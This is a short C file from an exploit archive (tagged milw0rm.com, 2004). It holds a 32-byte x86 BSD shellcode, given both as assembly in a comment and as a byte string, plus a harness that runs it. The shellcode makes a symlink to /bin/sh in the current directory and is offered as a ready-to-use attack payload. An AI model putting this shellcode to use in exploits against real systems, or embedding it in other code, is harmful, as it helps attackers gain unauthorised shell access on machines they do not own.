/*The shellcode calls the symlink() and makes the
 link to the /bin/sh in the current dir.
	short version
 size = 32 bytes
 OS   = *BSD
 	written by /rootteam/dev0id (www.sysworld.net)
				dev0id@uncompiled.com

BITS 32
jmp short	callme
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+7],al
	lea	ebx,[esi+5]
	push	ebx
	lea	ebx,[esi]
	push	ebx
	mov	al,57
	push	eax
	int	0x80

callme:
	call	main
	db	'/bin/sh'
*/

char shellcode[] =
	"\xeb\x12\x5e\x31\xc0\x88\x46\x07\x8d\x5e\x05\x53\x8d\x1e\x53"
	"\xb0\x39\x50\xcd\x80\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
	"\x73\x68";

int
main (void)
{
	void (*code)(void);
	code=(void(*)())shellcode;
	(void)code();
	return 0;
}

// milw0rm.com [2004-09-26]